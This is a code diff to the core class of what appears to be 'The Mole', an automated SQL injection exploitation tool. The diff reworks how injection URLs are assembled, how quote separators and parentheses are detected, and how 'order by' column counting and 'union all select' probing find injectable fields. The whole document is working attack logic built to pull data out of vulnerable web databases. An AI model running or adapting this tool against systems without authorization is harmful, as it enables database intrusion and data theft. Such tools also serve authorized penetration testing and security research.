@@ -46,6 +46,10 @@ class TheMole:
         self.mode = 'union'
         self.end = ' '
         self.threader = Threader(threads)
+        self.prefix = ''
+        self.end = ''
+        self.verbose = False
+        self.timeout = 0
     
     def restart(self):
         self.initialized = False
@@ -62,7 +66,6 @@ class TheMole:
             raise MoleAttributeRequired('Attribute needle is required')
         self.separator = ''
         self.comment = ''
-        self.end = ' '
         self.parenthesis = 0
         self.database_dump = DatabaseDump()
         
@@ -80,7 +83,7 @@ class TheMole:
             return
         if self.mode == 'union':
             req = self.get_requester().request(
-                self.generate_url('{sep} own3d by 1')
+                self.generate_url(' own3d by 1')
             )
             self._syntax_error_content = self.analyser.node_content(req)
             
@@ -101,7 +104,7 @@ class TheMole:
             self._detect_dbms()
         else:
             if not self.separator == ' ':
-                self.end = 'and {sep}{sep}={sep}'.format(sep=self.separator)
+                self.end = 'and {par}{sep}{sep}like{sep}'.format(sep=self.separator, par=(self.parenthesis * ')'))
             else:
                 self.end = ' '
             self._detect_dbms_blind()
@@ -109,13 +112,18 @@ class TheMole:
         self.initialized = True
 
     def generate_url(self, injection_string):
-        return self.url.replace(
+        url = self.url.replace(
                 self.wildcard,
-                injection_string.format(sep=self.separator,
+                ('{prefix}{sep}{par}' + injection_string + '{end}{com}').format(
+                                        sep=self.separator,
                                         com=self.comment,
                                         par=(self.parenthesis * ')'),
-                end=self.end)
+                                        prefix=self.prefix,
+                                        end=self.end)
         )
+        if self.verbose == True:
+            print('[i] Executing query:',url)
+        return url
     
     def get_requester(self):
         return self.requester
@@ -123,7 +131,7 @@ class TheMole:
     def set_mode(self, mode):
         if mode == 'blind':
             if self.initialized and self.separator != ' ':
-                self.end =  'and {sep}{sep}={sep}'.format(sep=self.separator)
+                self.end =  ' and {sep}{sep} like {sep}'.format(sep=self.separator)
         else:
             self.initialized = False
         self.mode = mode
@@ -141,7 +149,7 @@ class TheMole:
         if self.stop_query:
             return None
         req = self.get_requester().request(self.generate_url(query_generator(offset)))
-        result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
+        result = self._dbms_mole.parse_results(self.analyser.decode(req))
         if not result or len(result) < 1:
             raise QueryError()
         else:
@@ -260,7 +268,7 @@ class TheMole:
                         self._dbms_mole.dbinfo_query(self.query_columns, self.injectable_field)
                     )
                   )
-            data = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
+            data = self._dbms_mole.parse_results(self.analyser.decode(req))
         else:
             data = self._blind_query(
                 None,
@@ -369,24 +377,29 @@ class TheMole:
     
     def _find_separator(self):
         separator_list = ['\'', '"', ' ']
+        equal_cmp = { '\'' : 'like', '"' : 'like', ' ' : '='}
         separator = None
-        for sep in separator_list:
-            print('[i] Trying separator: "' + sep + '"')
-            self.separator = sep
-            req = self.get_requester().request(
-                self.generate_url('{sep}{par} and {sep}1{sep}={sep}1')
-            )
-            if self.analyser.is_valid(req):
-                separator = sep
-                break
+        for parenthesis in range(0, 2):
+            print('[i] Trying injection using',parenthesis,'parenthesis.')
+            self.parenthesis = parenthesis
+            for sep in separator_list:
+                print('[i] Trying separator: "' + sep + '"')
+                self.separator = sep
+                req = self.get_requester().request(
+                    self.generate_url(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}1')
+                )
+                if self.analyser.is_valid(req):
+                    separator = sep
+                    break
+            if separator:
+                # Validate the negation of the query
+                req = self.get_requester().request(
+                    self.generate_url(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}0')
+                )
+                if not self.analyser.is_valid(req):
+                    print('[+] Found separator: "' + self.separator + '"')
+                    return
         if not separator:
-            raise SQLInjectionNotDetected()
-        print('[+] Found separator: "' + self.separator + '"')
-        # Validate the negation of the query
-        req = self.get_requester().request(
-            self.generate_url('{sep}{par} and {sep}1{sep} = {sep}0')
-        )
-        if self.analyser.is_valid(req):
             raise SQLInjectionNotDetected()
     
     def _find_comment_delimiter(self):
@@ -401,7 +414,7 @@ class TheMole:
                 print('[i] Trying injection using comment:',com)
                 self.comment = com
                 req = self.get_requester().request(
-                    self.generate_url('{sep}{par} order by 1{com}')
+                    self.generate_url(' order by 1')
                 )
                 if self.analyser.node_content(req) != self._syntax_error_content:
                     comment = com
@@ -418,7 +431,7 @@ class TheMole:
         #Find the number of columns of the query
         #First get the content of needle in a wrong situation
         req = self.get_requester().request(
-            self.generate_url('{sep}{par} order by 15000{com}')
+            self.generate_url(' order by 15000')
         )
         content_of_needle = self.analyser.node_content(req)
         
@@ -426,7 +439,7 @@ class TheMole:
         done = False
         new_needle_content = self.analyser.node_content(
             self.get_requester().request(
-                self.generate_url('{sep}{par} order by %d {com}' % (last,))
+                self.generate_url(' order by %d ' % (last,))
             )
         )
         while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
@@ -435,7 +448,7 @@ class TheMole:
             sys.stdout.flush()
             new_needle_content = self.analyser.node_content(
                 self.get_requester().request(
-                    self.generate_url('{sep}{par} order by %d {com}' % (last,))
+                    self.generate_url(' order by %d ' % (last,))
                 )
             )
         pri = last // 2
@@ -447,7 +460,7 @@ class TheMole:
             sys.stdout.flush()
             new_needle_content = self.analyser.node_content(
                 self.get_requester().request(
-                    self.generate_url('{sep}{par} order by %d {com}' % (medio,))
+                    self.generate_url(' order by %d ' % (medio,))
                 )
             )
             if new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
@@ -466,11 +479,11 @@ class TheMole:
                 hashes, to_search_hashes = i
                 hash_string = ",".join(hashes)
                 if not hash_string in used_hashes:
-                    req = self.get_requester().request(
+                    req = self.analyser.decode(self.get_requester().request(
                             self.generate_url(
-                                "{sep}{par} and 1=0 union all select " + hash_string + " {com}"
+                                " and 1=0 union all select " + hash_string
                             )
-                        ).decode(self.analyser.encoding)
+                          ))
                     try:
                         self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
                         if len(self.injectable_fields) > 0:
